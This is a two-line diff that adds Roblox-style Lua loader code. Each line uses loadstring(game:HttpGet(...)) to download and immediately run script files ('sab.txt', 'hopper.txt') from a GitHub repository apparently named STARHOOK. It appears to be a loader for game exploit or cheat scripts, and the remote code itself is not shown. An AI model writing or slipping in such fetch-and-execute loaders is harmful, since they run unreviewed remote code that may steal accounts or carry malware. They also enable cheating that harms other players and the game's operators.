@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/uidnull/STARHOOK./refs/heads/main/sab.txt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/uidnull/STARHOOK./refs/heads/main/hopper.txt"))()
